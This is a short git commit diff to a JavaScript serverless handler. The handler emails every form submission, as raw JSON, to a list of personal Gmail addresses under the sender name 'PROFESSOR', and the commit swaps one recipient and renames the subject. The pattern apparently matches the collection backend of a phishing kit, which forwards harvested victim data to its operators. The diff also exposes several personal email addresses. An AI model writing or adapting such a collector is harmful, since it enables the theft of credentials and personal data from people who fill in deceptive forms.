fbd05179f7276a98c96ea686826b72d735e9de13
zm9807350 <zm9807350@gmail.com>
2026-04-28 09:11:12 +0500

    Update fahad.js

--- fahad.js
+++ fahad.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,official.brennanlsabella@gmail.com",
-      subject: "fahad",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,furqannizamani68@gmail.com",
+      subject: "Damro",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
